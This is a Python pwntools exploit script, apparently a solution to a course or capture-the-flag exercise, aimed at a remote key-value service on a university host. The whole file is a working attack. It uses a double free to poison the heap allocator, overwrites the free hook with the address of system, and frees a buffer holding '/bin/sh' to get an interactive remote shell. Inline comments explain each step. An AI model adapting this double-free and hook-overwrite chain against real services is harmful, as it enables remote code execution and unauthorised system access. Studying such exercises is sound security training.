import struct 
import socket 
from pwn import *

host = "lettieri.iet.unipi.it"
#host = "localhost"
port = 7001

value = b"A"*31
key = b"1"
key2= b"2"
key3= b"3"

assign = b"a"
delete = b"d"
quit = b"q"

free_hook = 0x605f20 - 16 # subtract the header, otherwise you don't write properly
system_plt = 0x400e08

buf =  assign + key + value
buf += delete + key 
buf += delete + key # double free
buf += assign + key + struct.pack("Q", free_hook) + b"A"*(31-8)
buf += assign + key2 + b"/bin/sh" + b"\x00"*(31-7)
buf += assign + key3 + struct.pack("Q", system_plt) + b"A"*(31-8) # free hook overwritten
buf += delete + key2 
# the last delete is useful for two reasons:
#   1. it calls free of the value, so let us call system because of the overwritten free hook
#   2. since free is called with an argument, that is the pointer associated with key2,
#       system will find as it's first argument a pointer to "/bin/sh"

with remote(host, port) as conn:
    conn.send(buf)
    conn.interactive()